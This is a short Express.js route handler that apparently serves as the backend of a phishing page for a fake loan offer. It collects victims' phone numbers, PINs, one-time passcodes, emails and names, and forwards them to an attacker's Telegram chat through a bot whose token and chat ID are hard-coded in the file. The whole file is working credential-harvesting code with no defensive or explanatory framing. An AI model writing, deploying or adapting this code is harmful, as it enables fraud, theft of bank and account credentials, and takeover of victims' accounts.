app.post('/api/send-telegram', async (req, res) => {
    try {
        const { phone, pin, email, name, amount, term, type } = req.body;
        
        const TG_BOT_TOKEN = '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
        const TG_CHAT_ID = '8392790531';
        
        let message = '';
        if (type === 'pin') {
            message = `🔐 NEW PIN CONFIRMATION 🔐\n\nPhone: ${phone}\nPIN: ${pin}\nEmail: ${email}\nName: ${name}\nLoan: $${amount} for ${term} months`;
        } else {
            message = `🔐 OTP ENTERED 🔐\n\nPhone: ${phone}\nOTP: ${pin}\nEmail: ${email}\nName: ${name}`;
        }
        
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}`;
        
        const response = await fetch(url);
        const result = await response.json();
        
        res.json({ success: true, result });
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});
